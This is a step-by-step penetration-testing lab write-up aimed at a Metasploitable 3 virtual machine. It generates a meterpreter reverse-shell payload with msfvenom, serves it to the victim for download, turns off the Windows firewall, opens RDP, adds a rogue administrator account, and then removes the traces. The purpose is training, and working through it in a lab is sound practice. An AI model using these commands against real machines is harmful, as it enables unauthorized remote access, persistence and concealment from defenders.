# RDP Exploitation Lab

<h2>Description</h2>
In this lab, you’ll be learning leverage your meterpreter shell to get yourself Remote Desktop access on the victim’s machine. You’ll do so by using the same payload you created for the Post Exploitation lab, so refer back to that if you haven’t done it. I’ll briefly cover it in this lab again, but it’s best to do the Post Exploitation lab first.
Step 1.
<br />


<h2>Environments Used </h2>

- <b>Windows 10</b> (21H2)

<h2>Program walk-through:</h2>

<p align="center">
Step 1: <br/>
Open up your Kali Linux’s terminal and make yourself root user.
<br />
<br />
Step 2: Start the Apache webserver service, since this is where the victim will “accidentally” download and run the payload. To do so type “service apache2 start”.  <br/>
<img src="https://media-hosting.imagekit.io/0a7881c1c1dc4962/IMG_1157.jpg?Expires=1838052699&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=BiMbM2NOdsjs3zG42ydDoLiwvMO7~eVEU5m37GZuWoLMVkZ~h23noRe8a63~4XblFBmboY23nPIH4qZ9OjqrPm1n41DOYL1rwgCgVQ6Ja9~Cz4vXdunfdwaZQCnf83SYSHyMRNVT~WgZZVODHuPRuv6kBwJboijki3Jq9sw0GZM6FO2CdOq-2fmvv-aLw~TyLRTZN1XU5reClfcToKPETII01o-N8eN4Bt2eZl1IYiIsBtR6-C-Xa46vMcgaiTseH8ELaX8E6ke3a-pluCXyu43GBjut~SrtVrbwcu8Hu1i2mWaLCzbhaU39GmIpnASq69U~hu7ctXL4dpK5MaPJIA__" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Step 2.5 Only do this step if you haven’t done the Post exploitation Lab nor created the payload from that lab. Move yourself to /var/www/html directory using “cd /var/www/html”. Then you’ll want to create the payload using this command “msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.2.15 lport=4444 -f exe -o payload.exe”. <br/>
<img src="https://media-hosting.imagekit.io/7c8729fa60ab424c/IMG_1158.jpg?Expires=1838052834&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=YhDvummx9L841FA4aKNT0k9vdDgwXczkyV-Np2eEAhFV-gm81k3B5L5FMVsUIsFKKQkJ5YffVXWGWLfqR3FnCRL4cquuUfgl6v~9X6beyEBavV9dDwdEMyT3P0cnZd4aBVQO4NeQLk-7f6IXw27mQ-Qi4J2nnUwyk0qe79R4GzJqezvdkeT0~64adombSV9cajKooqzvauoYmUqfL5aICWkMHwV8KJkzfXAU0b1fJNHZJX5cG0Ju5W3OAGrc9k-k2qDmqroGRWy95aDaNaNat7V8E0sGCsknspCtrem8MQNFhje92bPZl6u~iOwOlm3Ta2QPFz77ejMHx3bTZiAq2g__" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Step 3. Now that you’ve created the payload, enter yourself into the msfconsole using the command “msfconsole -q”  <br/>
<img src="https://media-hosting.imagekit.io/9240fc28a9604b7d/IMG_1159.jpg?Expires=1838052917&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=PMLZ7drK5Luxs4tRsw60XrgXV~cYLUawCakHt-j73wT7hVp39TDexfrEY6QhDYyOPoJRqVbNTVRa~IFTD4WVIfSEcnczJCwqndnQdJwHU0Y-ye5BKkTzCC-5QCBTVhw7UXrqcqufQ6P6O~93eDa43DMwX-ajCIFQ~M7dpsXntankTDeGC4-0WZTXOEOZ4sZZ3A1Ghyi2iaV9JKpbfxovjGKHUa5QmzwdxL9pjAtKEEIqcb7OkTyWqyKUXSSCe4OfcXSPr95QXgbg7rOXlGsJXKOgsFcsDBm~C4vC1aLbL~tLgDoE9~ySKOgpp23b8JVqqZxeY~yPZFRGT8ZA4sHSnw__" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Step 4. Since our payload is a meterpreter reverse_tcp payload where the victim machine will talk back to our host machine. We’re going to need a listener. So, we’ll use the generic listening module “use exploit/multi/handler”.  <br/>
<img src="https://media-hosting.imagekit.io/ac016aca43204180/IMG_1162.jpg?Expires=1838052995&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=1PT~PLALUXQp1dsU~aV6r05FofEaU1CpVPutcwz7~0u4pyN5qG8MdpVQWrud~KNDukVY-lDqeUu3f7Eff7BnMYSFahuu6JJpEiILiNLlAJax56SHJKLnRW~t12EQAxyxBJOQ0WwmNLMoEi1rmB9uA8F4cHwc~fH52X3PWeNnpz1hiLNzzzbAF05IUQ6j2OHHIK5xOxP3T1XxTmhf~EJI6xLd4zxrwt-5r~MJdXgT6fgDlhbMs2hjqZaJq-t~kwJQjJcpyoYSlvrQDSEWoHJmXgYgE4nCMoY8g09xGbLpx~koEngHefgJqMb1YMTi81jjk7Jve1MZ4FAU20K2IkHj~A__" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Step 5. Remember, we need to set the payloads and lhost for this module, so you have to do the command “set payload windows/meterpreter/reverse_tcp” and “set lhost 10.0.2.15”. You can check to see everything is set up properly using “options”  <br/>
<img src="https://media-hosting.imagekit.io/da5e1ee320514c8c/IMG_1188.jpg?Expires=1838053142&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=hDhfwE6fPXnpUxgzYLo6CuROZv~a9WVwZ23Rnrx8knu8q3inYbTlWkSHzd~JST9gse3oCg2FHtO-SHujbpYL5Aea9VHNyZ8XCkdDfCPj9~qUJ0TvmyBTnd77x11UgS03MHQvIbWcicTVuUEfbRsNzTu9uFLNMpTzXnQfJmWfl5QbGYaQYUi9S7cMrC3B6QvfIg-Q4QnAyyRo~D2tpXnOuiw0yMgGlBxYaMbWApWlZ7iaexZNr6K8vFdFhtXJPAqsu~xtUl3HBWM2dhHw1gH5ynvQucwXkQsElhyICNSenQsO6uRUwxkh4fGYdPMUoNK9GpQz55eaK9t6lrXYmqx9yQ__" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Step 6. Open up your Metasploitable 3 machine and launch a web browser. So, you can go the webpage “10.0.2.15/payload.exe”. Remember to replace the IP address with the ip address of your own Kali Linux’s IP. Since the payload is hosted on your Kali Linux’s VM. When you go the web page and get prompted with the run option. Start your listener on your msfconsole first by typing “run”.  <br/>
<img src="https://media-hosting.imagekit.io/e52c65c475304772/IMG_1190%20(1).jpg?Expires=1838053867&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=lvWWTrJgO17KSj3JpnmbhRbhln7AUBTXt1nx-fZvtZ2rp~DBw1NeWfkUNeaIheSPZlcvn1eaO15XzKEvb6p~KFQ57YeO04lEuMLoaFFDgXFeWqGQ6VzVRRctpO7FEHlARdyUqkDK-2g-EfmrCcnvIPCKlIIl~co8tBk3Q-N5xXQ6W5qKGD2r31-Y081gh7f63HoFxs0l~fvpRNlbtiKO7b0-5H4hDAX2D2DcGVfuyZu3bnNwITmpK0wn~O9Y-5FzCkymJBAjlMZ1mMJ2aQb8NCZW7KlA6DLJbfXzbncnvG5zve-u8oTGmF8jLvmtlefukMXuJxsMNxORIYVsX0rfjw__" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Step 7. Now that we have meterpreter access, we want to get shell access so we can turn off firewall that is filtering out our RDP connection. To enter shell simply type “shell” into your meterpreter. If you don’t trust me that firewall is filtering out RDP connections just type “nmap -p 3389 10.0.2.20”. You can see that it’s filtered out  <br/>
<img src="https://media-hosting.imagekit.io/0fa1e286b42d42b6/IMG_1191.jpg?Expires=1838053955&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=DXSv1~sWQOgfy9A~NO5DpcRkS1c2YtgcM7q7B725Rywv7eMcfbTa2opEL92kEVuye-IkpAscplBbH7RjpeNi~OAZClACsPKGRbJj9bsYW352HUmLvsgso1Gf9uCYd4LMFp6nyp9bCwEwGxI3gighy1EdpYDi9g7qUraXHFxspKuFpKVKjG5PXkW8IQnWDeKIDXaIJPrhOYwC2J14n3PdoVDNRqom2riHhnMB2~CdKtZ3T1rWGtvk22rrObRreQYszhwl5OlLjEpZ-o2kgyf154hdMKrFa7U9NuCjVfDKz4ErzEQfUEikHwSj0EU7wvSVFklqpX~l4GFcPgktJLOmSg__" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Step 8. To turn off the firewall, type “netsh advfirewall set currentprofile state off”  <br/>
<img src="https://media-hosting.imagekit.io/e128b52025ba4e31/IMG_1166%20(1).jpg?Expires=1838055486&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=t2v64~LvnjZEE1lAHsNzhRMLvJKJMjNP2~vUGaUUnqdRBc1uQ-bOjf1LeabVB6bHIKqeJxFCN8q-Ao-q8TxMMGwxBAi271QrdWpZedGKdTt12SBJvUIQU3ayVEbLgrSnxp3o37tfxJJsgXTr5rv7QstWU1~9elQoDEUsTCyZy0XjKDAMto7u5Lw6zi8feqyCpxon63OXvQXQwT3YZv8xXKlbYbD5LwqABnk4EfZVQ60YEhG8KPrNrrI1II3oRjx4JyxiLQZLDz~q6vy7JqU1Eq4FlxkrswSP-obdDHa-pyDzwQh4QWwt3GKw7qkJWSnfJY0bb7cRViTtDvYDV0yJ6Q__" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Step 9. Now you’ll be able to remote desktop into Metasploitable 3. So, open a new tab and type in “rdesktop -u vagrant -p vagrant 10.0.2.20”. -u and -p are the username and password respectively.  <br/>
<img src="https://media-hosting.imagekit.io/975b7c01661141f4/IMG_1167.jpg?Expires=1838054819&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=cdEAu5dEzr37f0VjEWGkWttk4a0k0vC0qA9TPYYCnsb4VkK2VhFyYA7A9zmUdToZ2R4QbF0T0XTEOU0k~utQq~KBoSNBjJcdTNuojvGUx-wmXF1mj-t4GW4euEbjgE36I853NY2ln5Hrfx5dYq0XR~Uo1E1WZ1PPgD90QUgUvmDjxJ64FvyunrKW8CWY-~72zkqMNA-mQSl5iADNfeSuF2U~mdth~kgZrCwsIJpdxJM48zrMVNbBJO~6fwhHesNT57ZHjQ~GQ0F0dXzGpQ~LP8OwICQKRFA0gfKSiPSZNan4rmQzKC39xR4MvjtS71J4hE-wsaNtBBwforNAgK2DtA__" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Step 10. You now have remote access, but you’ll notice that this will kick the original user out. So, what we want to do is create a second account and add that account to the administrators group. To do so, go back to the terminal and type “net user bob tor
/add” This will add another user on the machine with the username bob and password tor.  <br/>
<img src="https://media-hosting.imagekit.io/dc49d64025c34fa8/IMG_1168.jpg?Expires=1838055294&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=baeeetZ9dRXAt2ca9E837GVSs8lOWGtBv-RbTsC5bf3GuwEKNZofWl4f-XzL6JCvZbSFoljtTvynr9bgOxTmB8W7PjxRkqDrX47BO7k8WLCmN8T1l3JmhmI5DBFmfi-XElOVSX~cZa0bG-dR9JF5SgGW7WbsEeff042psaoSK8xU~ryB4BwYA~G-K8kSAvnboEwPOYWbvYcu41WjOVI8EsO-Hp-6svVV~BTz44W60s9bkw53I81W9dmkZB0j9llOViXrSVg5Y7A56c4-LccH6D07EKgITuprlxEcMxtdQFpX1L~cqws6sIa-j6U-~K2BE74z4Ts-rMP5UOgWKzDgdw__" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Step 11. Add it to the administrator group by typing “net localgroup administrators bob /add”  <br/>
<img src="https://media-hosting.imagekit.io/5b61e4e5cab9471b/IMG_1169.jpg?Expires=1838055095&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=nzmN6KfHzAXVaYWfz8WCWER2gnKU-FMhar0SYDhPk8EjeUv~Bzj8Drya3V8Xd-DTeqdkRS-HxyHbAn6vY0r1JkMzHCcKifUGyIgqgtgakVXpgSRK3K7oOJRHA3hlk1zSp7davR3fBJkY4zfUgZ8giRSFrpsUdmBe3P1igsTISUGeXCrTNUYquKN8ZdHDBrJ5lf-8rVPyp7oKX7ZbGICZJszSLEmuU~MA6KiTU3IyxLBm4DUz2qj6VJdKd5iHu4HDkd9GEm-Q8nch4Q~orKq6oLqKJRI6H~VztGgj4fN493QsIZM5y6IDsRA59uLQK8~c7JLSluHkAIvQAalUM5Hhfg__" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Step 12. Now that you’ve created bob and added it to the admin group. You can RDP into bob using “rdesktop -u bob -p tor 10.0.2.20” without kicking out the other user on the machine.  <br/>
<img src="https://media-hosting.imagekit.io/8aec4b415f2c4d34/IMG_1170.jpg?Expires=1838055182&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=fqFA69RLctuUGI8cvRFTdOvZ6eDUx-AQ7nB69zvdrpEW6w6CsTlN5eP5FdKtsnONin~hL1cLKxV12Vm-kp6e9gZal89age~UpB124XHyD08EqdZ0Ucoz-y4N-~KidFMWk4vvWX93la98h9L0nf~55et8d~53sJtd756ysFl~ACUVGm44gYeb4BRF0hGX~15aYPkpHbiZFJMx0vdEiYTSW6851NnwG5funkpIFvS~vo4p-ZK1KYI3~kfzh~R5G~BVEiHe6Gw5U2K1Y83mLQfF2qc6U2b0e5o3TM-nFixIHiHkjepvCiPbSIOEXWHfQ8z-BNpURkafcO8UXBQ4i~X3eg__" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Step 13. Afterward you wouldn’t want them to know about you so you would try your best to remove traces of yourself and turn back on the firewall. So you’ll want to delete the user using “net user bob /delete”  <br/>
<img src="https://media-hosting.imagekit.io/5209c710a3004277/IMG_1171.jpg?Expires=1838055052&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=zbNdNhOmL6qh0huLUdMnWIF7CsnjefoXq0co-Tb5BO4Pe7v4noDeYNydc-p6eDN9tX0NV1ddEl8z3-xrNVa5GRlaZz9nKDiQ9fzcyUcpB60bweHogTKLCm~xmwYDHqHjm7Zyt34G~yza9tmTkkfgQ2VZbSl5OYmYpk5Ogs2WOaGVFksZ30~saUkGkNLOgCxYfjqADFc2c0eckUGIxkJGNrWIoQaEFGhDZm29k2IYosERCdEDwLc5xopad7b1JWDO5yA06wRQMuXKeDVuYRvdd0zYqNbvTAjSXm~Gv29piA6SO8LlCdDM3wJ1hvzunZbNfUkHpFEqW5Jbhbnl3X4GEQ__" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
And to turn on the firewall again. Type “netsh advfirewall set currentprofile state on”. This will also terminate the connection if you still have it open.  <br/>
<img src="https://media-hosting.imagekit.io/69d0adcaf1ce41db/IMG_1172.jpg?Expires=1838054137&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=QKlgU3ivknPMiMdnhVQ2x2EWPrx-zMvNBZ3KTUT~V53Gz-kPCdGLGIWoBCMwJmZ3SmOAsBOfNYgJJ9QnlVF9~2rF9nZ4qMU~gfx4T8dUjLtyJv8gRya~XcSm5lL8kTXRxCH1M4OrTERIsCxu2idh16XVEI2ffKcWmQ3YwMfFwDADfOOiYag91ZQhaQbIt9xlgQB0vD2lP3qCCx61G89Jz-T~~ydAVS5mmD~WdclSDp1dMvY-lrfHbiwcfU85UOcLt8AM~oSlvK-zDk6LVj9VCBuM3C2YFYwej49FbAgsYYkqoePwEJ5Zt79F8HlDv1c-es1fFnjDJX4oR6lpjjtaQg__" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />

<!--
 ```diff
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
```
--!>
